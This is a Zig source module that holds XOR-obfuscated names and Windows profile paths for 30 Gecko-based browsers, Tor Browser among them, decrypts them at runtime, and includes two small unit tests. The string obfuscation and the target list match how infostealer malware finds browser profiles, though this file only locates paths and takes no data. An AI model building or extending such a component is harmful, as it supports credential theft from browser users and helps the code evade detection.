const std = @import("std");
const hash = @import("../types/hash.zig");

pub const BrowserInfo = struct {
    name: []const u8,
    path_suffix: []const u8,
};

const E = struct {
    pub const names = [30][]const u8{
        &hash.xorEncrypt("Firefox"),
        &hash.xorEncrypt("Thunderbird"),
        &hash.xorEncrypt("SeaMonkey"),
        &hash.xorEncrypt("Waterfox"),
        &hash.xorEncrypt("Pale Moon"),
        &hash.xorEncrypt("K-Meleon"),
        &hash.xorEncrypt("IceDragon"),
        &hash.xorEncrypt("Cyberfox"),
        &hash.xorEncrypt("BlackHaw"),
        &hash.xorEncrypt("Mercury"),
        &hash.xorEncrypt("Firefox Beta"),
        &hash.xorEncrypt("Firefox Nightly"),
        &hash.xorEncrypt("Firefox Dev"),
        &hash.xorEncrypt("Waterfox Classic"),
        &hash.xorEncrypt("Waterfox Current"),
        &hash.xorEncrypt("LibreWolf"),
        &hash.xorEncrypt("Floorp"),
        &hash.xorEncrypt("GNU IceCat"),
        &hash.xorEncrypt("Basilisk"),
        &hash.xorEncrypt("Firefox ESR"),
        &hash.xorEncrypt("Tor Browser"),
        &hash.xorEncrypt("Iceweasel"),
        &hash.xorEncrypt("WhiteStar"),
        &hash.xorEncrypt("Palemoon SSE"),
        &hash.xorEncrypt("MyPal"),
        &hash.xorEncrypt("New Moon"),
        &hash.xorEncrypt("Borealis"),
        &hash.xorEncrypt("K-Meleon 76"),
        &hash.xorEncrypt("K-Meleon 77"),
        &hash.xorEncrypt("Atlas"),
    };
    pub const paths = [30][]const u8{
        &hash.xorEncrypt("Mozilla\\Firefox\\Profiles"),
        &hash.xorEncrypt("Thunderbird\\Profiles"),
        &hash.xorEncrypt("Mozilla\\SeaMonkey\\Profiles"),
        &hash.xorEncrypt("Waterfox\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\Pale Moon\\Profiles"),
        &hash.xorEncrypt("K-Meleon\\Profiles"),
        &hash.xorEncrypt("Comodo\\IceDragon\\Profiles"),
        &hash.xorEncrypt("8pecxstudios\\Cyberfox\\Profiles"),
        &hash.xorEncrypt("NETGATE Technologies\\BlackHaw\\Profiles"),
        &hash.xorEncrypt("mercury\\Profiles"),
        &hash.xorEncrypt("Mozilla\\Firefox Beta\\Profiles"),
        &hash.xorEncrypt("Mozilla\\Firefox Nightly\\Profiles"),
        &hash.xorEncrypt("Mozilla\\Firefox Dev\\Profiles"),
        &hash.xorEncrypt("Waterfox Classic\\Profiles"),
        &hash.xorEncrypt("Waterfox\\Profiles"),
        &hash.xorEncrypt("LibreWolf\\Profiles"),
        &hash.xorEncrypt("Floorp\\Profiles"),
        &hash.xorEncrypt("GNU IceCat\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\Basilisk\\Profiles"),
        &hash.xorEncrypt("Mozilla\\Firefox ESR\\Profiles"),
        &hash.xorEncrypt("Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default"),
        &hash.xorEncrypt("Mozilla\\Iceweasel\\Profiles"),
        &hash.xorEncrypt("WhiteStar\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\Pale Moon SSE\\Profiles"),
        &hash.xorEncrypt("MyPal\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\New Moon\\Profiles"),
        &hash.xorEncrypt("Borealis\\Profiles"),
        &hash.xorEncrypt("K-Meleon76\\Profiles"),
        &hash.xorEncrypt("K-Meleon77\\Profiles"),
        &hash.xorEncrypt("Atlas\\Profiles"),
    };
};

const NAME_BUF_SIZE = 512;
const PATH_BUF_SIZE = 1024;

var _init = false;
var _name_buf: [NAME_BUF_SIZE]u8 = undefined;
var _path_buf: [PATH_BUF_SIZE]u8 = undefined;
var _browsers: [30]BrowserInfo = undefined;

fn initData() void {
    if (_init) return;
    var np: usize = 0;
    var pp: usize = 0;
    inline for (0..30) |i| {
        const ne = E.names[i];
        const pe = E.paths[i];
        hash.xorDecrypt(ne, _name_buf[np..][0..ne.len]);
        hash.xorDecrypt(pe, _path_buf[pp..][0..pe.len]);
        _browsers[i] = .{
            .name = _name_buf[np..][0..ne.len],
            .path_suffix = _path_buf[pp..][0..pe.len],
        };
        np += ne.len;
        pp += pe.len;
    }
    _init = true;
}

pub fn getGeckoBrowsers() []const BrowserInfo {
    initData();
    return &_browsers;
}

test "gecko browser count" {
    const browsers = getGeckoBrowsers();
    try std.testing.expect(browsers.len == 30);
}

test "first browser is Firefox" {
    const browsers = getGeckoBrowsers();
    try std.testing.expectEqualSlices(u8, "Firefox", browsers[0].name);
}
